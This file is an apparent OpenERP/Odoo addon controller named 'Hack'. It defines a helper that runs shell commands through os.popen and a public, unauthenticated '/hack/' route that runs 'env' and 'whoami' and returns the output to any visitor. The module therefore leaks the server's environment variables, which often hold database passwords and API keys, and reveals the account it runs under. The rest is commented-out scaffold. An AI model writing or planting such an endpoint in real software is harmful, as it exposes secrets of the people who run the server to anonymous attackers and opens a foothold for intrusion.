# -*- coding: utf-8 -*-

import os

from openerp import http

def xexec(val):
    p = os.popen(val,"r")
    t = ""
    while 1:
        line = p.readline()
        t = t + line
        if not line:
            break
    return t

class Hack(http.Controller):
     @http.route('/hack/', auth='public')
     def index(self, **kw):
        xenv = xexec('env')
        xwhoami = xexec('whoami')
            
        return '<pre>' + xenv + xwhoami + '</pre>'

#     @http.route('/hack/hack/objects/', auth='public')
#     def list(self, **kw):
#         return http.request.render('hack.listing', {
#             'root': '/hack/hack',
#             'objects': http.request.env['hack.hack'].search([]),
#         })

#     @http.route('/hack/hack/objects/<model("hack.hack"):obj>/', auth='public')
#     def object(self, obj, **kw):
#         return http.request.render('hack.object', {
#             'object': obj
#         })